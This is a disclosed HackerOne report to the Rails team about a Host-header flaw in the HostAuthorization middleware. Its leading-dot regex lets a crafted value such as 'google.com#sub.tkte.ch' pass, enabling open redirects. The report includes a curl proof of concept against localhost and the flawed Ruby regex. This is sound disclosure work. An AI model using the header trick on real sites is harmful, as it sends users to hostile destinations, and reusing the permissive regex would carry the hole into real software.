# HostAuthorization middleware does not suitably sanitize the Host / X-Forwarded-For header allowing redirection.

## Report Details
- **Report ID**: 1047447
- **URL**: https://hackerone.com/reports/1047447
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-11-30T23:25:50.500Z
- **Disclosed**: 2021-02-11T01:39:07.028Z

## Reporter
- **Username**: tktech
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
When a site is configured to use the `.tkte.ch` (leading dot) short form for domain name, ex:

```ruby
config.hosts <<  '.tkte.ch'
```

it is then sanitized in sanitize_string, where it is turned into a regex:

```ruby
        def sanitize_string(host)
          if host.start_with?(".")
            /\A(.+\.)?#{Regexp.escape(host[1..-1])}\z/
          else
            host
          end
        end
```

The regex it is wrapped in is too permissive. It allows for things like:

```
❯ curl -i -H "Host: google.com#sub.tkte.ch" http://localhost:3001/
HTTP/1.1 302 Found
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Location: http://google.com#sub.tkte.ch/
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Request-Id: 3b1702ac-a58f-44bf-af8a-a2933a9946fd
X-Runtime: 0.004726
Transfer-Encoding: chunked

<html><body>You are being <a href="http://google.com#sub.tkte.ch/">redirected</a>.</body></html>
```

Where the controller is simply:

```ruby
class RedirectController < ApplicationController
  def main
    redirect_to action: 'main'
  end
end
````

The host header poisoning was reported to us by a 3rd party researcher, and tracking it down led to this.

## Impact

A user can be redirected to a hostile site.

## Attachments
No attachments
